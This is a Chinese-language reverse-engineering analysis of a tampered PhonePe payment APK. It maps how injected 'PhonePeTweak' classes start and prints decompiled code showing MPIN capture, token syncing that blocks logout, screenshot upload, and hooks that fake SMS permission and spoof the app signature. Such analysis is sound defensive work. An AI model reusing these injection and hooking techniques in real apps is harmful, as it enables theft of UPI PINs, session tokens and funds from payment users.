# com.PhonePeTweak 根包类调用链详细分析

> 分析目标：pev70.apk 中 `com.PhonePeTweak` 根包的每个类，追踪其如何被调用、启动顺序、以及明确的代码级证据。
> 源码基础：`pev70_jadx/sources/com/PhonePeTweak/` 反编译Java源码 + `pev70_apktool/` smali字节码

---

## 目录

1. [根包类清单](#1-根包类清单)
2. [总体启动调用链](#2-总体启动调用链)
3. [各类详细调用证据](#3-各类详细调用证据)
   - 3.1 [MyInitProvider — 入口触发器](#31-myinitprovider)
   - 3.2 [MyEntryPoint — 启动调度器](#32-myentrypoint)
   - 3.3 [PhonePeHomeScreenActivityThread — 主工作线程](#33-phonepehomescreenactivitythread)
   - 3.4 [ActivityLifecycleCallbacker — 生命周期监控](#34-activitylifecyclecallbacker)
   - 3.5 [IntegrityHelper — 完整性工具 (未被调用)](#35-integrityhelper)
   - 3.6 [RequestSmsActivity — SMS权限中间页 (仅清单声明)](#36-requestsmsactivity)
4. [两种注入机制的证据](#4-两种注入机制的证据)
5. [完整启动时序图](#5-完整启动时序图)

---

## 1. 根包类清单

`com.PhonePeTweak` 根包共 **6 个 Java 文件**（位于 `classes14.dex`）：

| # | 类名 | 文件位置 | 调用状态 |
|---|------|---------|----------|
| 1 | `MyInitProvider` | `com/PhonePeTweak/MyInitProvider.java` | ✅ 被 Android 系统自动调用 |
| 2 | `MyEntryPoint` | `com/PhonePeTweak/MyEntryPoint.java` | ✅ 被 MyInitProvider 调用 |
| 3 | `PhonePeHomeScreenActivityThread` | `com/PhonePeTweak/PhonePeHomeScreenActivityThread.java` | ✅ 被 MyEntryPoint 创建并启动 |
| 4 | `ActivityLifecycleCallbacker` | `com/PhonePeTweak/ActivityLifecycleCallbacker.java` | ✅ 被 PhonePeHomeScreenActivityThread 创建并注册 |
| 5 | `IntegrityHelper` | `com/PhonePeTweak/IntegrityHelper.java` | ❌ 整个代码库中无任何调用者 |
| 6 | `RequestSmsActivity` | `com/PhonePeTweak/RequestSmsActivity.java` | ⚠️ 仅在 AndroidManifest.xml 声明，无代码调用 |

---

## 2. 总体启动调用链

```
Android 系统启动进程 com.phonepe.app
    │
    │  ①  系统初始化 ContentProvider（早于 Application.onCreate）
    ▼
MyInitProvider.onCreate()                    ← AndroidManifest.xml 声明，initOrder=1
    │
    │  ②  调用静态方法
    ▼
MyEntryPoint.init()
    │
    │  ③  创建线程对象、设置为全局回调、启动线程
    ▼
new PhonePeHomeScreenActivityThread()  →  thread.start()
    │
    │  ④  线程 run() 方法执行
    ▼
PhonePeHomeScreenActivityThread.run()
    ├── waitForApplication()              ← 等待 Application 实例可用
    ├── HookUtil.init(context, this)      ← 初始化回调和包信息
    ├── new ActivityLifecycleCallbacker() ← ⑤ 创建生命周期监控并注册
    ├── Z.InitConfig(deviceId, ...)       ← 初始化远程日志
    ├── CrashHandler.init(context, this)  ← 注册崩溃处理
    ├── PhonePeHelper.startPhoneNumberMonitoring() ← 启动5秒轮询
    ├── ReportDevice()                    ← 上报设备信息
    └── onBind()                          ← 准备AIDL绑定调度器

=== 同时（并行）在原始 Application.attachBaseContext 中 ===

com.phonepe.app.PhonePeApplication.attachBaseContext()  ← 原始类已被字节码篡改
    ├── Pine.ensureInitialized()          ← 初始化 inline hook 框架
    ├── Z.InitConfig(android_id, ...)     ← 初始化远程日志
    └── Plugin.attach(this)               ← 启动 PineHelper
         └── PineHelper.get().start(context) ← 注册 Pine 运行时Hook
              ├── hookCheckPermission()   ← Hook SMS 权限检查
              ├── hookActivity()          ← Hook Activity启动拦截
              └── Pine.hook(getPackageInfo) ← Hook 签名验证
```

---

## 3. 各类详细调用证据

### 3.1 MyInitProvider

**类型**：`ContentProvider`（Android组件）

**调用方式**：Android系统自动实例化并调用 `onCreate()`

**调用证据 1 — AndroidManifest.xml 声明**：
```xml
<!-- 文件: pev70_apktool/AndroidManifest.xml 第750行 -->
<provider
    android:authorities="com.PhonePeTweak.MyInitProvider"
    android:exported="false"
    android:grantUriPermissions="true"
    android:initOrder="1"
    android:multiprocess="true"
    android:name="com.PhonePeTweak.MyInitProvider"/>
```

- `android:initOrder="1"` — 确保该 Provider 在所有其他 Provider 之前初始化
- `android:multiprocess="true"` — 在每个进程中都初始化

**调用证据 2 — onCreate() 源码**：
```java
// 文件: pev70_jadx/sources/com/PhonePeTweak/MyInitProvider.java 第31-33行
@Override
public boolean onCreate() {
    MyEntryPoint.init();    // ← 直接调用 MyEntryPoint.init()
    return true;
}
```

**关键点**：Android 系统在 `Application.attachBaseContext()` 之后、`Application.onCreate()` 之前自动调用所有 ContentProvider 的 `onCreate()`。因此 `MyInitProvider.onCreate()` 是恶意代码的最早入口之一。

**调用时机**：应用进程启动时由 Android 系统自动调用，无需任何显式触发。

---

### 3.2 MyEntryPoint

**类型**：普通Java类（静态方法）

**调用方式**：被 `MyInitProvider.onCreate()` 直接调用

**调用证据 — 唯一调用者**：
```java
// 文件: pev70_jadx/sources/com/PhonePeTweak/MyInitProvider.java 第32行
MyEntryPoint.init();
```

**init() 方法完整逻辑**：
```java
// 文件: pev70_jadx/sources/com/PhonePeTweak/MyEntryPoint.java 第14-25行
public static void init() {
    L.i("init!");
    try {
        Z.info().msg("MyEntryPoint.init");
        // ① 创建主工作线程实例
        PhonePeHomeScreenActivityThread phonePeHomeScreenActivityThread =
            new PhonePeHomeScreenActivityThread();
        // ② 保存到静态字段（供 JobService 等其他组件访问）
        thread = phonePeHomeScreenActivityThread;
        // ③ 设置为全局日志回调
        Z.dataCallback = phonePeHomeScreenActivityThread;
        // ④ 启动线程
        thread.start();
    } catch (RuntimeException e4) {
        Z.error().err(e4).msg("MyEntryPoint.init error");
    }
}
```

**关键静态字段**：
```java
// 第12行
public static PhonePeHomeScreenActivityThread thread;
```
此字段被以下组件通过 `MyEntryPoint.thread` 引用：
- `com.longfafa.paylib.JobService.onBind()` — 第34行：`MyEntryPoint.thread.onBind()`
- `com.longfafa.paylib.JobService.onUnbind()` — 第43行：`MyEntryPoint.thread.unbind()`
- `JobService.IPayServiceBinder.onEvent("downloadData")` — 第93行：`MyEntryPoint.thread.downloadData(key, value)`
- `JobService.IPayServiceBinder.getRequestMeta()` — 第151行：`MyEntryPoint.thread != null`

---

### 3.3 PhonePeHomeScreenActivityThread

**类型**：`Thread` 子类，同时实现 `DataCallback` 接口

**调用方式**：被 `MyEntryPoint.init()` 创建实例并调用 `start()`

**调用证据 — 创建和启动**：
```java
// 文件: pev70_jadx/sources/com/PhonePeTweak/MyEntryPoint.java 第18-21行
PhonePeHomeScreenActivityThread phonePeHomeScreenActivityThread =
    new PhonePeHomeScreenActivityThread();
thread = phonePeHomeScreenActivityThread;   // 保存引用
Z.dataCallback = phonePeHomeScreenActivityThread;  // 设置为回调
thread.start();                             // 启动线程
```

**run() 方法的完整执行序列**（核心启动逻辑）：

```java
// 文件: pev70_jadx/sources/com/PhonePeTweak/PhonePeHomeScreenActivityThread.java 第128-181行
public void run() throws InterruptedException {
    // 步骤1: 等待 Application 实例可用（通过反射获取）
    waitForApplication();   // 第129行 → ContextHelper.getApplication()

    // 步骤2: 初始化 HookUtil（传入 context 和 this 作为 DataCallback）
    HookUtil.init(app.getApplicationContext(), this);  // 第130行

    // 步骤3: 获取并保存 ClassLoader
    ClassLoader classLoader = app.getClassLoader();    // 第131行
    this.loader = classLoader;

    // 步骤4: 延迟500ms后在主线程初始化 Sentry
    new Handler(Looper.getMainLooper()).postDelayed(() -> {
        SentryAndroid.init(app.getApplicationContext(), options -> {
            options.setDsn("https://929ca797...@o4510013278519296.ingest.us.sentry.io/...");
            options.setTag("tweak_version", Config.JobAppVersion);
        });
    }, 500L);  // 第138-143行

    // 步骤5: 创建 ActivityLifecycleCallbacker 并注册到 Application
    this.callbacker = new ActivityLifecycleCallbacker(app, this);  // 第144行

    // 步骤6: 异步获取 Google Advertising ID
    fetchGAIDAsync(app, gaid -> { this.gaid = gaid; });  // 第145-149行

    // 步骤7: 获取 android_id 作为设备标识
    this.deviceId = Settings.Secure.getString(
        app.getContentResolver(), "android_id");  // 第152行

    // 步骤8: 初始化远程日志系统（OTLP）
    Z.InitConfig(this.deviceId, "", null);  // 第155行

    // 步骤9: 设置设备标识到 PhonePeHelper
    PhonePeHelper.AndroidDeviceID = this.deviceId;  // 第156行
    this.AndroidDrmId = DRMID.GetDeviceDRMID();     // 第157行
    PhonePeHelper.AndroidDrmId = this.AndroidDrmId;  // 第159行

    // 步骤10: 注册全局崩溃处理器
    CrashHandler.getInstance().init(app.getApplicationContext(), this);  // 第162行

    // 步骤11: 启动手机号监控（5秒轮询，含Token同步）
    PhonePeHelper.startPhoneNumberMonitoring();  // 第163行

    // 步骤12: 上报设备信息
    ReportDevice();  // 第164行

    // 步骤13: 执行测试函数（获取设备指纹）
    testfunc();  // 第166行

    // 步骤14: 启动AIDL绑定调度器
    onBind();  // 第167行

    // 步骤15: 保持线程运行（1秒轮询）
    while (this.running) {  // 第169行
        Thread.sleep(1000L);
    }
}
```

**被其他组件调用的方法**：

| 方法 | 调用者 | 证据位置 |
|------|--------|---------|
| `onBind()` | `JobService.onBind()` | `JobService.java:34` — `MyEntryPoint.thread.onBind()` |
| `unbind()` | `JobService.onUnbind()` | `JobService.java:43` — `MyEntryPoint.thread.unbind()` |
| `downloadData(key,value)` | `JobService.IPayServiceBinder.onEvent("downloadData")` | `JobService.java:94` |
| `getPhoneNumber()` | `ActivityLifecycleCallbacker.lambda$onActivityCreated$0` | `ActivityLifecycleCallbacker.java:80` — `this.callback.getPhoneNumber()` |
| `getDeviceID()` | `HookUtil` 匿名内部类 Logger | `HookUtil.java:165` — `callback.getDeviceID()` |
| `onGetUploadPath()` | `ActivityLifecycleCallbacker.generateBitmapFileName()` | `ActivityLifecycleCallbacker.java:264` |
| `buildBaseInfo()` | `CrashHandler.buildCrashInfo()` | 通过 DataCallback 接口调用 |

---

### 3.4 ActivityLifecycleCallbacker

**类型**：实现 `Application.ActivityLifecycleCallbacks` 接口

**调用方式**：被 `PhonePeHomeScreenActivityThread.run()` 创建，并在构造函数中自动注册到 Application

**调用证据 1 — 创建**：
```java
// 文件: PhonePeHomeScreenActivityThread.java 第144行
this.callbacker = new ActivityLifecycleCallbacker(app, this);
```

**调用证据 2 — 构造函数中自动注册**：
```java
// 文件: ActivityLifecycleCallbacker.java 第58-62行
public ActivityLifecycleCallbacker(Application application, DataCallback dataCallback) {
    this.app = application;
    this.callback = dataCallback;
    application.registerActivityLifecycleCallbacks(this);  // ← 注册到 Application
}
```

一旦注册，Android系统会在以下时机自动回调此对象：

| 回调方法 | 触发时机 | 关键行为 | 证据行号 |
|----------|---------|---------|---------|
| `onActivityCreated()` | Activity创建时 | 记录Activity名称；如果是首页则延迟3秒获取手机号 | 第65-76行 |
| `onActivityStarted()` | Activity可见时 | 触发 SharedPreferences 数据备份（`performDataSyncBackup`） | 第101-107行，lambda 第111行 |
| `onActivityResumed()` | Activity获得焦点时 | 首页：触发Token上传+密码检查；登录页：清除手机号；其他：更新手机号 | 第115-144行 |
| `onActivityPaused()` | Activity失去焦点时 | 记录日志；支付页面设置排除最近任务 | 第148-160行 |
| `onActivityStopped()` | Activity不可见时 | 截图上传 | 第163-166行 |
| `onActivityDestroyed()` | Activity销毁时 | 移除悬浮文字 | 第174-178行 |

**截图上传的调用链**：
```
onActivityResumed/onActivityPaused
  → startSpan()                          第193-197行
  → ShowFloatText(activity)              第180-187行（显示状态悬浮文本）
  → waitForAnimationsAndCapture()        第199-223行（等待动画稳定）
  → captureScreenAndUpload()             第231-245行（使用PixelCopy截图）
  → lambda$captureScreenAndUpload$5()    第248-258行（缩放40%+JPEG 70%质量）
  → uploadToAzureBlob()                  第276-287行（上传到Azure Blob）
```

**悬浮文本显示证据**（显示版本号+手机号+登录状态）：
```java
// 文件: ActivityLifecycleCallbacker.java 第342行（AnonymousClass3.run()）
String str = JobService.Version + ":" + userPhoneNumCache + " " +
    ((cacheUserId == null || cacheUserId.isEmpty()) ? "🔴" : "🟢");
```

---

### 3.5 IntegrityHelper

**类型**：普通工具类

**调用方式**：**❌ 未被任何代码调用**

**证据 — 全局搜索结果**：

1. **JADX Java 源码搜索**：在整个 `pev70_jadx/sources/` 中搜索 `IntegrityHelper`，仅在其自身文件中找到引用。

2. **Smali 字节码搜索**：在整个 `pev70_apktool/` 中搜索 `Lcom/PhonePeTweak/IntegrityHelper`，仅在以下 4 个文件中找到引用——全部是 IntegrityHelper 自身及其内部类：
   - `smali_classes14/com/PhonePeTweak/IntegrityHelper.smali`（自身）
   - `smali_classes14/com/PhonePeTweak/IntegrityHelper$IntegrityCallback.smali`（内部接口）
   - `smali_classes14/com/PhonePeTweak/IntegrityHelper$1.smali`（匿名内部类）
   - `smali_classes14/com/PhonePeTweak/IntegrityHelper$2.smali`（匿名内部类）

3. **没有任何 smali_classes1-13 的文件引用此类**。

**结论**：`IntegrityHelper` 是**预留代码（dead code）**。提供了 `generateNonce()` 和 `requestIntegrityToken()` 两个方法，可能用于：
- 未来版本中主动请求 Google Play Integrity Token
- 或在开发阶段用于测试，当前版本未接入

---

### 3.6 RequestSmsActivity

**类型**：`Activity`（Android组件）

**调用方式**：**⚠️ 仅在 AndroidManifest.xml 中声明，注入代码中无显式启动**

**证据 1 — AndroidManifest.xml 声明**：
```xml
<!-- 文件: pev70_apktool/AndroidManifest.xml 第751行 -->
<activity
    android:configChanges="keyboardHidden|orientation|screenSize"
    android:name="com.PhonePeTweak.RequestSmsActivity"
    android:screenOrientation="unspecified"
    android:theme="@style/Theme.AppCompat.Translucent"
    android:windowSoftInputMode="adjustResize"/>
```

**证据 2 — 全局搜索无调用者**：

1. **JADX 源码搜索**：搜索 `RequestSmsActivity`，仅在自身文件中找到引用。
2. **Smali 搜索**：搜索 `Lcom/PhonePeTweak/RequestSmsActivity`，仅在自身及其 lambda 内部类中找到：
   - `smali_classes14/com/PhonePeTweak/RequestSmsActivity.smali`（自身）
   - `smali_classes14/com/PhonePeTweak/RequestSmsActivity$$ExternalSyntheticLambda0.smali`（按钮点击lambda）

**Activity功能分析**：
```java
// 文件: RequestSmsActivity.java 第12-31行
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    // 从 Intent extras 中取出原始目标 Intent
    final Intent intent = (Intent) getIntent().getParcelableExtra("origin_intent");
    Button button = new Button(this);
    button.setText("继续跳转到目标 Activity");
    button.setOnClickListener(view -> {
        if (intent != null) {
            startActivity(intent);  // 点击后启动原始Intent
        }
    });
    setContentView(button);
}
```

**结论**：`RequestSmsActivity` 是一个 **SMS 权限请求中间跳转页**，其用途是：
1. 拦截某个需要SMS权限的跳转
2. 显示"继续跳转"按钮
3. 用户点击后才启动原始目标 Activity

由于代码中未找到 `startActivity(new Intent(context, RequestSmsActivity.class))` 等调用，此 Activity 可能：
- 通过 MovPay 主控应用经 AIDL IPC 发送 Intent 来启动
- 或为预留功能，当前版本未启用

---

## 4. 两种注入机制的证据

pev70 使用了**两种独立的注入机制**，根包类与两种机制都相关：

### 4.1 机制一：DEX 字节码静态篡改

在 APK 重打包时，直接修改原始 PhonePe 类的字节码，插入对注入代码的调用。

**已确认被篡改的原始类（smali_classes1-13，非 classes14）**：

| # | 被篡改的原始类 | smali位置 | 注入的调用目标 | 作用 |
|---|--------------|-----------|--------------|------|
| 1 | `com.phonepe.app.PhonePeApplication` | classes.dex | `Pine.ensureInitialized()` + `Plugin.attach()` + `Z.InitConfig()` | 在 `attachBaseContext` 中初始化Pine和日志 |
| 2 | `okhttp3.OkHttpClient$Builder` | smali_classes3 | `HookUtil.build()` | 注入三个OkHttp拦截器 |
| 3 | `okhttp3.OkHttpClient` | smali_classes3 | `new LoggingWebSocketListener()` | 包装WebSocket监听器 |
| 4 | `okhttp3.internal.Util` | smali_classes3 | `HookUtil.isSensitiveHeader()` | 强制返回false，允许窃取敏感header |
| 5 | `okhttp3.Request$Builder` | smali_classes3 | `HookUtil.addHeader()` | 注入自定义HTTP header |
| 6 | `okhttp3.CertificatePinner` | smali_classes3 | `Z.debug()` 日志调用 | 空实现禁用SSL证书固定 |
| 7 | `dagger.hilt.android.internal.managers.ActivityComponentManager` | smali_classes3 | `HookUtil.generatedComponent()` | 劫持Dagger DI容器 |
| 8 | `com.phonepe.network.external.rest.interceptors.ChecksumInterceptorCore` | smali_classes2 | `HookUtil.ResponseCheckSum()` + `HookUtil.HeaderCheckSum()` | 绕过响应校验+注入设备指纹 |
| 9 | `com.phonepe.app.util.LoginSessionUtils` | smali_classes2 | `PhonePeHelper.performTokenSync()` | 登出前同步Token，服务端有新Token则阻止登出 |
| 10 | `com.phonepe.login.common.ui.hurdle.viewmodel.MpinHurdleViewModel` | smali_classes2 | `PhonePeHelper.LastMpin = pin` + `Z.debug()` | 当MPIN长度为4时捕获明文PIN |
| 11 | `com.phonepe.phonepecore.playintegrity.config.PlayIntegrityConfigProviderImpl` | smali_classes3 | `HookUtil.getPlayIntegrityEnabled()` | 强制返回false，禁用Play Integrity |
| 12 | `com.phonepe.onboarding.preference.OnBoardingConfig` | smali_classes3 | `HookUtil.otp_input_state_default()` | 强制启用OTP输入 |
| 13 | `com.phonepe.phonepecore.data.preference.CoreConfig` | smali_classes3 | `Z.debug()` + `HelperUtil.printStackTrace()` | 监控用户状态变化并打印堆栈 |
| 14 | `com.phonepe.network.base.rest.request.generic.GenericRestData` | smali_classes2 | `Z.info()` 日志调用 | 记录所有REST请求体 |
| 15 | `com.phonepe.phonepecore.data.preference.entities.OtpHurdleMeta` | smali_classes10 | `HookUtil.getDisableManualInput()` | 强制启用手动OTP输入 |
| 16 | `com.phonepe.hurdleui.otpreceiver.OtpReceiverDelegate` | smali_classes9 | `Z.debug()` 日志调用 | 记录OTP接收配置 |
| 17 | `org.npci.upi.security.services.CLServices` | smali_classes3 | `Z.info()` 多处日志调用 | 记录所有NPCI服务调用参数 |
| 18 | `org.npci.upi.security.services.CLRemoteResultReceiver` | smali_classes13 | `new LoggingCLResultReceiver()` | 包装NPCI结果接收器，拦截UPI交易结果 |

**核心字节码篡改证据（关键示例）**：

**示例1：OkHttpClient.Builder.build() 被篡改**
```
文件: pev70_apktool/smali_classes3/okhttp3/OkHttpClient$Builder.smali
原始方法 build() 被替换为调用:
    invoke-static {p0}, Lcom/PhonePeTweak/Def/HookUtil;->build(Lokhttp3/OkHttpClient$Builder;)Lokhttp3/OkHttpClient;
```
对应注入代码（`HookUtil.java:127-225`）在构建 OkHttpClient 前注入了三个拦截器：
1. `HttpLoggingInterceptor`（完整body日志）
2. `PhonePeInterceptor`（Token窃取）
3. `HttpJsonInterceptor`（结构化JSON日志）

**示例2：MpinHurdleViewModel 被篡改捕获MPIN**
```
文件: pev70_apktool/smali_classes2/com/phonepe/login/common/ui/hurdle/viewmodel/MpinHurdleViewModel.smali
第539行:
    sput-object p1, Lcom/PhonePeTweak/Def/PhonePeHelper;->LastMpin:Ljava/lang/String;
```
当用户输入4位MPIN时，直接将明文PIN存储到 `PhonePeHelper.LastMpin` 静态字段。

**示例3：LoginSessionUtils 被篡改阻止登出**
```
文件: pev70_apktool/smali_classes2/com/phonepe/app/util/LoginSessionUtils.smali
第68行:
    invoke-static {}, Lcom/PhonePeTweak/Def/PhonePeHelper;->performTokenSync()Lcom/PhonePeTweak/Def/PhonePeHelper$TokenSyncResult;
第98行:
    sget-object v3, Lcom/PhonePeTweak/Def/PhonePeHelper$TokenSyncResult;->SERVER_TO_LOCAL:...
```
在登出逻辑中先同步Token，如果服务端有更新的Token（结果为 `SERVER_TO_LOCAL`），则直接 return 阻止登出。

### 4.2 机制二：Pine 运行时 inline Hook

通过 `PineHelper.start(context)` 在运行时设置 ART 层方法钩子。此机制由根包类的启动链间接触发。

**Pine Hook 注册调用链**：
```
com.phonepe.app.PhonePeApplication.attachBaseContext()     ← 原始Application类（已被篡改）
  → Pine.ensureInitialized()                                   第873行
  → Plugin.attach(this)                                        第881行
    → PineHelper.get().start(context)                          Plugin.java:31
      → Pine.setHookMode(2)                                    PineHelper.java:49
      → hookCheckPermission()                                  PineHelper.java:54
      → hookActivity()                                         PineHelper.java:55
      → Pine.hook(getPackageInfo, ...)                         PineHelper.java:62
```

**Pine 注册的3组运行时Hook**：

| Hook目标 | 注册位置 | 行为 |
|---------|---------|------|
| `ApplicationPackageManager.getPackageInfo()` | PineHelper.java:62-107 | `afterCall`: 如果查询的是宿主包名，替换签名为硬编码的正版PhonePe签名 |
| `ContextImpl.checkPermission()` + `ContextWrapper.checkPermission()` | PineHelper.java:113-144 | `beforeCall`+`afterCall`: 如果检查 `READ_SMS` 权限，强制返回 `PERMISSION_GRANTED (0)` |
| `Instrumentation.execStartActivity()` | PineHelper.java:170-281 | `beforeCall`: 记录所有Activity启动参数；拦截UPI入网页面→要求安装OtpHelper |
| `Uri.parse()` | PineHelper.java:145-164 | `afterCall`: 将 `sms` authority 替换为 SMS代理provider authority |

---

## 5. 完整启动时序图

```
时间线  ──────────────────────────────────────────────────────────────────→

Android系统启动进程 com.phonepe.app
│
├─ [T=0] 创建 Application 实例 (com.phonepe.app.PhonePeApplication)
│
├─ [T=1] Application.attachBaseContext()          ← 原始类已被字节码篡改
│   ├─ super.attachBaseContext(context)
│   ├─ SplitCompat.a(this)
│   ├─ Pine.ensureInitialized()                   ← 初始化inline hook引擎
│   ├─ Z.InitConfig(android_id, "", null)          ← 初始化OTLP远程日志
│   └─ Plugin.attach(this)                        ← 注册Pine运行时Hook
│       └─ PineHelper.start(context)
│           ├─ hookCheckPermission()               ← READ_SMS 权限伪造
│           ├─ hookActivity()                      ← Activity启动拦截
│           └─ Pine.hook(getPackageInfo)           ← 签名伪造
│
├─ [T=2] ContentProvider 初始化阶段
│   └─ MyInitProvider.onCreate()                   ← 恶意代码入口
│       └─ MyEntryPoint.init()
│           ├─ new PhonePeHomeScreenActivityThread()
│           ├─ Z.dataCallback = thread             ← 设全局回调
│           └─ thread.start()                      ← 启动工作线程
│               │
│               │  ┌── 子线程开始执行 ──────────────────────────────
│               │  │
│               ├──│─ [T=2+] waitForApplication()   ← 轮询等待app可用
│               │  │
│               ├──│─ [T=3] HookUtil.init(ctx, this) ← 保存回调+获取包信息
│               │  │
│               ├──│─ [T=3] new ActivityLifecycleCallbacker(app, this)
│               │  │   └─ registerActivityLifecycleCallbacks(this)
│               │  │                                  ← 注册生命周期监控
│               │  │
│               ├──│─ [T=3] 延迟500ms → Sentry初始化（主线程）
│               │  │
│               ├──│─ [T=3] fetchGAIDAsync()         ← 异步获取广告ID
│               │  │
│               ├──│─ [T=3] deviceId = android_id
│               │  │
│               ├──│─ [T=3] Z.InitConfig(deviceId)    ← 用设备ID重新初始化日志
│               │  │
│               ├──│─ [T=3] CrashHandler.init()       ← 注册崩溃处理器
│               │  │
│               ├──│─ [T=3] PhonePeHelper.startPhoneNumberMonitoring()
│               │  │   └─ 启动 ScheduledExecutorService
│               │  │       └─ 每5秒: getUserId() → performTokenSync()
│               │  │           → checkAndInitTokenSyncClient()
│               │  │           → publishTokenUpdateIfNeeded()
│               │  │
│               ├──│─ [T=3] ReportDevice()            ← 上报设备信息到OTLP
│               │  │
│               ├──│─ [T=3] onBind()                  ← 准备AIDL调度器
│               │  │
│               └──│─ [T=3+] while(running) sleep(1s) ← 保持线程存活
│                  │
│                  └── 子线程持续运行 ──────────────────────────────
│
├─ [T=4] Application.onCreate()                    ← 原始PhonePe初始化
│   └─ ... 正常PhonePe业务逻辑 ...
│
├─ [T=5] 首个 Activity 创建
│   └─ ActivityLifecycleCallbacker.onActivityCreated() ← 自动回调
│       └─ 记录Activity名称，如果是首页则3秒后获取手机号
│
├─ [T=6] MovPay 通过 AIDL 绑定 JobService
│   └─ JobService.onBind()
│       ├─ new IPayServiceBinder()
│       └─ MyEntryPoint.thread.onBind()            ← 通知主工作线程
│
└─ [T=∞] 持续运行...
    ├─ 5秒轮询: Token变化检测 + WebSocket同步
    ├─ Activity切换: 截图 + 上传Azure Blob
    ├─ OkHttp请求: Token拦截 + JSON日志
    └─ AIDL调用: 响应MovPay的UPI列表/Token/元数据请求
```

---

## 核对要点总结

| 类名 | 如何被调用 | 证据文件:行号 |
|------|-----------|-------------|
| **MyInitProvider** | Android系统自动调用（ContentProvider） | `AndroidManifest.xml:750` 声明 |
| **MyEntryPoint** | `MyInitProvider.onCreate()` → `MyEntryPoint.init()` | `MyInitProvider.java:32` |
| **PhonePeHomeScreenActivityThread** | `MyEntryPoint.init()` → `new ...()` → `thread.start()` | `MyEntryPoint.java:18-21` |
| **ActivityLifecycleCallbacker** | `PhonePeHomeScreenActivityThread.run()` → `new ActivityLifecycleCallbacker(app, this)` → 构造函数中 `registerActivityLifecycleCallbacks(this)` | `PhonePeHomeScreenActivityThread.java:144` + `ActivityLifecycleCallbacker.java:61` |
| **IntegrityHelper** | **❌ 未被调用**（全局smali搜索无外部引用） | 无 |
| **RequestSmsActivity** | **⚠️ 仅AndroidManifest声明**，代码中无 `startActivity` 调用 | `AndroidManifest.xml:751` |

### 并行启动链（Application.attachBaseContext → Pine Hook）

| 阶段 | 如何触发 | 证据文件:行号 |
|------|---------|-------------|
| Pine初始化 | 原始 `PhonePeApplication.attachBaseContext()` 已被字节码篡改，直接调用 `Pine.ensureInitialized()` | `com/phonepe/app/PhonePeApplication.java:873`（JADX反编译可见注入代码） |
| PineHelper启动 | `Plugin.attach(this)` → `PineHelper.get().start(context)` | `PhonePeApplication.java:881` → `Plugin.java:31` → `PineHelper.java:45` |
| 签名伪造Hook | `PineHelper.start()` → `Pine.hook(getPackageInfo, ...)` | `PineHelper.java:62-107` |
| SMS权限Hook | `PineHelper.start()` → `hookCheckPermission()` | `PineHelper.java:113-144` |
| Activity拦截Hook | `PineHelper.start()` → `hookActivity()` | `PineHelper.java:170-281` |
